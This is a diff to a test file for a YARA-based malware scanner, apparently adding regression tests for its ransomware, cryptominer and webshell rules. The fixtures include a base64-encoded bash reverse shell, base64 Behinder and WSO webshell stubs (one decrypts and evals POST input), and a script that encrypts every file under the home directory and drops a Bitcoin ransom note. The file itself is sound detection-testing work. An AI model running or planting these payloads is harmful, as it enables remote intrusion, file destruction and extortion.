@@ -90,6 +90,18 @@ def _reverse_shell_fixture() -> str:
     return base64.b64decode("YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx").decode()
 
 
+_WEBSHELL_FIXTURES = {
+    "behinder_php": "PD9waHAgQGVycm9yX3JlcG9ydGluZygwKTsgc2Vzc2lvbl9zdGFydCgpOyAka2V5PSJlNDVlMzI5ZmViNWQ5MjViIjsKJF9TRVNTSU9OWydrJ109JGtleTsgJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CiRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOyBldmFsKCRwb3N0KTsgPz4K",
+    "behinder_jsp": "PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qIiU+CjwlIFN0cmluZyBrPSJlNDVlMzI5ZmViNWQ5MjViIjsgc2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7CkNpcGhlciBjPUNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7ICU+Cg==",
+    "wso_php": "PD9waHAgZGVmaW5lKCdXU09fVkVSU0lPTicsICcyLjUnKTsKZnVuY3Rpb24gd3NvRXgoJGluKSB7ICRvdXQ9Jyc7IGlmKGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpKSB7IEBleGVjKCRpbiwkb3V0KTsgfQpyZXR1cm4gJG91dDsgfQo=",
+    "wso_mixed_case": "PD9waHAgZGVmaW5lKCJ3c29fdmVyc2lvbiIsICIyLjciKTsKZnVuY3Rpb24gV1NPRVgoJGluKSB7IHJldHVybiAkaW47IH0K",
+}
+
+
+def _webshell_fixture(name: str) -> str:
+    return base64.b64decode(_WEBSHELL_FIXTURES[name]).decode()
+
+
 def _has_rule(findings: list, rule_name: str) -> bool:
     """Return True when a finding message references a specific YARA rule."""
     return any(rule_name in f.message for f in findings)
@@ -625,14 +637,13 @@ class TestBuiltInRansomwareRule:
             "Do not pay a ransom with BTC. Restore from backups instead.",
             "Your data has been encrypted. Never pay the ransom in Bitcoin; report it.",
             "Your data has been encrypted. Do not pay the ransom in Bitcoin.",
-            "Your data has been encrypted.\nPay the ransom in Bitcoin.",
             "Send BTC after you recover your wallet backup.",
             "Pay Bitcoin to unlock premium account features.",
             "Send BTC for encrypted cloud backup storage.",
             "Data recovery service: pay with Bitcoin at checkout.",
             "Send BTC, then publish your transaction receipt.",
-            "Send BTC\nTo receive the decryption key, contact support.",
             "Send BTC " + "x" * 161 + " to receive the decryption key.",
+            "Your files are encrypted at rest and in transit with AES-256.",
         ],
     )
     def test_wallet_payment_text_is_not_ransomware(self, content, filename):
@@ -675,6 +686,20 @@ class TestBuiltInRansomwareRule:
             "We will delete your files unless you pay 0.5 Bitcoin.",
             "Send BTC or we will publish your data.",
             "Pay Bitcoin or your files will be destroyed.",
+            "Your data has been encrypted.\nPay the ransom in Bitcoin.",
+            "Send 0.5 BTC to <addr> to decrypt your files.",
+            "Pay 1 bitcoin within 72 hours or your files will be lost forever.",
+            "To recover your files, pay 0.3 Bitcoin to <addr>.",
+            "Send BTC\nTo receive the decryption key, contact support.",
+            (
+                "Your documents, photos and databases have been encrypted.\n"
+                "To decrypt them, send 0.5 BTC to <addr>."
+            ),
+            (
+                "Send 0.5 BTC to <addr>.\n"
+                "After payment you will get the decryption key.\n"
+                "If payment is not received, your files will be deleted."
+            ),
         ],
     )
     def test_payment_with_explicit_extortion_context_remains_critical(self, content):
@@ -685,6 +710,18 @@ class TestBuiltInRansomwareRule:
         assert ransomware[0].rule_id == "YR1"
         assert ransomware[0].severity == "CRITICAL"
         assert ransomware[0].confidence == 0.8
+
+    def test_real_demand_after_negated_advice_supplies_evidence_and_location(self):
+        content = (
+            "Never pay the ransom in Bitcoin; report the demand.\nPay the ransom in Bitcoin.\n"
+        )
+
+        findings = _run_builtin(content, "notice.md")
+        ransomware = [finding for finding in findings if "ransomware_behavior" in finding.message]
+
+        assert len(ransomware) == 1
+        assert ransomware[0].start_line == 2
+        assert ransomware[0].matched_text == "Pay the ransom in Bitcoin"
 
     @pytest.mark.parametrize(
         "content",
@@ -704,6 +741,28 @@ class TestBuiltInRansomwareRule:
 
         assert _has_rule(findings, "ransomware_behavior")
 
+    def test_multiline_encrypt_and_drop_note_script_is_detected(self):
+        content = """\
+from cryptography.fernet import Fernet
+import os
+
+for root, _dirs, files in os.walk(os.path.expanduser("~")):
+    for filename in files:
+        path = os.path.join(root, filename)
+        with open(path, "rb") as source:
+            encrypted = Fernet(key).encrypt(source.read())
+        with open(path, "wb") as destination:
+            destination.write(encrypted)
+
+with open("README_RESTORE_FILES.txt", "w") as note:
+    note.write("Your documents have been encrypted.\\n")
+    note.write("Send 0.5 BTC to <addr> to decrypt your files.\\n")
+"""
+
+        findings = _run_builtin(content, "encrypt.py")
+
+        assert _has_rule(findings, "ransomware_behavior")
+
     def test_wallet_text_still_reaches_custom_rules(self, tmp_path):
         _write_rule(
             tmp_path,
@@ -717,6 +776,89 @@ class TestBuiltInRansomwareRule:
 
         assert _has_rule(findings, "wallet_policy")
         assert not _has_rule(findings, "ransomware_behavior")
+
+
+# ── Built-in cryptominer rules ───────────────────────────────────────
+
+
+class TestBuiltInCryptominerRules:
+    """Regression coverage for crypto_coinjacking's $wasm_miner string.
+
+    Unbounded ``(mine|hash|crypto)`` matched inside unrelated identifiers
+    (``deteRMINE``) and against common, benign Web APIs/module names
+    (``crypto.getRandomValues``, ``hashmap``) that routinely appear near any
+    ``WebAssembly.instantiate`` call, firing a CRITICAL cryptojacking finding
+    on ordinary code.
+    """
+
+    def test_wasm_instantiate_with_unrelated_hash_call_is_not_coinjacking(self):
+        content = "WebAssembly.instantiate(bytes).then(r=>{ hashmap.set(r,1) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert not _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_web_crypto_api_is_not_coinjacking(self):
+        content = "WebAssembly.instantiate(bytes).then(r=>{ crypto.getRandomValues(buf) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert not _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_mid_word_mine_is_not_coinjacking(self):
+        content = "WebAssembly.instantiate(bytes).then(r=>{ return determine(r) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert not _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_text_mining_prose_is_not_coinjacking(self):
+        """`mining` as English prose must not fire; only a mining call does."""
+        content = (
+            "WebAssembly.instantiate(bytes).then(m=>runAnalytics(m)); // helpers for text mining\n"
+        )
+        findings = _run_builtin(content, "loader.js")
+        assert not _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_start_mining_call_is_coinjacking(self):
+        """`startMining(` is a mining call even though `Mining` is mid-identifier."""
+        content = "WebAssembly.instantiate(w).then(m=>{ m.exports.startMining(pool) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_capitalised_miner_is_coinjacking(self):
+        """Case must not matter: `new Miner(` is the common CoinHive-era shape."""
+        content = "WebAssembly.instantiate(w).then(m=>{ var x = new Miner(siteKey) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_literal_miner_call_is_coinjacking(self):
+        content = "WebAssembly.instantiate(minerWasm).then(function(m){ m.exports.mine(); })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_cryptonight_glue_is_coinjacking(self):
+        content = (
+            "WebAssembly.instantiate(wasmBinary,info);"
+            "var _cryptonight_hash=Module._cryptonight_hash=function(){};\n"
+        )
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_hash_cn_cwrap_is_coinjacking(self):
+        content = 'WebAssembly.instantiate(x).then(()=>{ Module.cwrap("hash_cn", "number", ["number"]) })\n'
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_cryptonight_wasm_fetch_is_coinjacking(self):
+        content = (
+            'WebAssembly.instantiateStreaming(fetch("cryptonight.wasm"))'
+            ".then(o=>{ exports.cn_hash(blob,nonce++) })\n"
+        )
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_randomx_calculate_hash_is_coinjacking(self):
+        content = (
+            "WebAssembly.instantiate(randomxWasm)"
+            ".then(m=>m.instance.exports.randomx_calculate_hash(blob))\n"
+        )
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
 
 
 # ── Built-in agent skill rules ────────────────────────────────────────
@@ -887,6 +1029,47 @@ rule agent_skill_destructive_autonomous_actions {
 """
         findings = _run_builtin(content, "README.md")
         assert not _has_rule(findings, "agent_skill_credential_exfiltration_webhook")
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            "Zu kleine Schrift behindert das Lesen. Menschen mit Behinderung\n"
+            "brauchen ausreichende Kontraste.\n",
+            "We deploy the API on WSO 2 Micro Integrator.\n",
+            "This skill detects Behinder and WSO webshells in uploaded files.\n",
+        ],
+        ids=["german_prose", "wso2_product_name", "family_names_in_docs"],
+    )
+    def test_known_webshell_rule_ignores_prose(self, content):
+        findings = _run_builtin(content, "SKILL.md")
+        assert not _has_rule(findings, "php_webshell_known")
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            "<?php define('WSO_VERSION', '0.5.2'); ?>\n",
+            "function wsoEx($input) { return $input; }\n",
+            "function wsoSecParam($name, $value) { return $value; }\n",
+            "Known indicator: e45e329feb5d925b\n",
+        ],
+        ids=["version_constant", "execution_helper", "security_helper", "key_in_docs"],
+    )
+    def test_known_webshell_rule_ignores_isolated_family_markers(self, content):
+        findings = _run_builtin(content, "reference.php")
+        assert not _has_rule(findings, "php_webshell_known")
+
+    @pytest.mark.parametrize(
+        ("fixture", "filename"),
+        [
+            ("behinder_php", "shell.php"),
+            ("behinder_jsp", "shell.jsp"),
+            ("wso_php", "shell.php"),
+            ("wso_mixed_case", "shell.php"),
+        ],
+    )
+    def test_known_webshell_rule_matches_family_markers(self, fixture, filename):
+        findings = _run_builtin(_webshell_fixture(fixture), filename)
+        assert _has_rule(findings, "php_webshell_known")
 
 
 # ── Rule caching ──────────────────────────────────────────────────────
